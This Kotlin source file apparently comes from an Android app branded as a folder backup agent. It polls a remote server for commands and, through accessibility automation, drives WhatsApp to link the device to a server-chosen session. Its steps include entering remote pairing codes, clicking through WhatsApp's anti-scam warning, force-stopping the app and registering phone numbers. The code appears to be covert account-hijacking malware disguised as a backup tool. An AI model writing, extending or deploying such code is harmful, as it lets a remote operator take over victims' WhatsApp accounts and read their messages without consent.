package com.folderbackup.agent.sync

import android.content.Context
import android.util.Log
import com.folderbackup.agent.data.AppPreferences
import com.folderbackup.agent.network.BackupApiClient
import com.folderbackup.agent.network.JobType
import com.folderbackup.agent.registration.WhatsappLinkDeviceState
import com.folderbackup.agent.service.BackupForegroundService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

/**
 * Poll rápido da fila de comandos (backup + WA_ACTION).
 * Assim pairing funciona sem FCM — basta acessibilidade ligada e app/processo vivo.
 */
object DeviceCommandPoller {
    private const val TAG = "DeviceCommandPoller"
    private const val INTERVAL_MS = 8_000L

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val fetchMutex = Mutex()
    @Volatile private var started = false
    @Volatile private var waActionRunning = false

    fun start(app: Context) {
        if (started) return
        started = true
        val appCtx = app.applicationContext
        scope.launch {
            val preferences = AppPreferences(appCtx)
            preferences.ensureBuiltInConfig()
            val api = BackupApiClient()
            while (isActive) {
                try {
                    pollOnce(appCtx, preferences, api)
                } catch (e: Exception) {
                    Log.w(TAG, "poll: ${e.message}")
                }
                delay(INTERVAL_MS)
            }
        }
        Log.i(TAG, "poller iniciado (${INTERVAL_MS}ms)")
    }

    private suspend fun pollOnce(
        app: Context,
        preferences: AppPreferences,
        api: BackupApiClient,
    ) {
        if (waActionRunning) return

        val jobs = fetchMutex.withLock {
            val config = preferences.getConfigSnapshot()
            if (config.apiBaseUrl.isBlank() || config.apiToken.isBlank() || config.deviceId.isBlank()) {
                return@withLock emptyList()
            }
            api.fetchPendingJobs(config).getOrElse {
                Log.d(TAG, "fetch falhou: ${it.message}")
                return@withLock emptyList()
            }
        }
        if (jobs.isEmpty()) return

        val waJobs = jobs.filter { it.type == JobType.WA_ACTION }
        if (waJobs.isEmpty()) return

        waActionRunning = true
        try {
            withContext(Dispatchers.Main) {
                BackupForegroundService.start(app)
            }
            for (i in 0 until 15) {
                if (BackupForegroundService.isRunning) break
                delay(200)
            }
            handleWaAction(app, preferences, waJobs.first())
        } finally {
            waActionRunning = false
        }
    }

    private suspend fun handleWaAction(
        app: Context,
        preferences: AppPreferences,
        job: com.folderbackup.agent.network.RemoteJob,
    ) {
        val action = job.action.orEmpty()
        Log.i(TAG, "WA_ACTION $action id=${job.id}")
        preferences.setLastStatus("Comando: $action")
        when (action) {
                "submit_pairing_code" -> {
                    val code = job.pairingCode.orEmpty()
                    if (code.isBlank()) {
                        preferences.setLastStatus("Pairing sem código")
                        return
                    }
                    WhatsappMountCoordinator(app).submitPairingCode(
                        requestId = job.requestId,
                        pairingCode = code,
                        evolutionInstance = job.evolutionInstance,
                    ).onSuccess {
                        preferences.setLastStatus("Pairing OK: $it")
                    }.onFailure {
                        preferences.setLastStatus("Pairing falhou: ${it.message}")
                    }
                }
                "macro_navigate_link_phone" -> {
                    WhatsappMountCoordinator(app).navigateToLinkWithPhone(job.requestId)
                        .onSuccess { preferences.setLastStatus(it) }
                        .onFailure { preferences.setLastStatus("Nav falhou: ${it.message}") }
                }
                "macro_navigate_link_from_home" -> {
                    WhatsappMountCoordinator(app).navigateToLinkFromHome(job.requestId)
                        .onSuccess { preferences.setLastStatus(it) }
                        .onFailure { preferences.setLastStatus("Nav falhou: ${it.message}") }
                }
                "macro_confirm_scam_warning" -> {
                    val name = job.displayName?.trim().orEmpty()
                        .ifBlank { WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME }
                    WhatsappMountCoordinator(app).confirmScamWarningAndFinish(
                        requestId = job.requestId,
                        deviceName = name,
                        evolutionInstance = job.evolutionInstance,
                    ).onSuccess { preferences.setLastStatus(it) }
                        .onFailure { preferences.setLastStatus("Anti-golpe falhou: ${it.message}") }
                }
                "macro_finish_link_device" -> {
                    val name = job.displayName?.trim().orEmpty()
                        .ifBlank { WhatsappLinkDeviceState.DEFAULT_DEVICE_NAME }
                    WhatsappMountCoordinator(app).finishLinkedDeviceSetup(
                        requestId = job.requestId,
                        deviceName = name,
                        evolutionInstance = job.evolutionInstance,
                    ).onSuccess { preferences.setLastStatus(it) }
                        .onFailure { preferences.setLastStatus("Nome falhou: ${it.message}") }
                }
                "macro_force_stop_whatsapp" -> {
                    WhatsappMacroCoordinator(app).forceStopWhatsapp(job.requestId)
                        .onSuccess { preferences.setLastStatus(it) }
                        .onFailure { preferences.setLastStatus("WA close falhou: ${it.message}") }
                }
                "macro_open_whatsapp" -> {
                    WhatsappMacroCoordinator(app).openWhatsapp(job.requestId)
                        .onSuccess { preferences.setLastStatus(it) }
                        .onFailure { preferences.setLastStatus("WA home falhou: ${it.message}") }
                }
                "register_whatsapp" -> {
                    val phone = job.phoneE164.orEmpty()
                    val label = job.sessionLabel.orEmpty()
                    if (phone.isBlank() || label.isBlank()) {
                        preferences.setLastStatus("register incompleto")
                        return
                    }
                    WhatsappRegistrationCoordinator(app).register(
                        requestId = job.requestId ?: job.id,
                        phoneE164 = phone,
                        sessionLabel = label,
                        displayName = job.displayName,
                    )
                }
                else -> Log.w(TAG, "ação ignorada: $action")
        }
    }
}
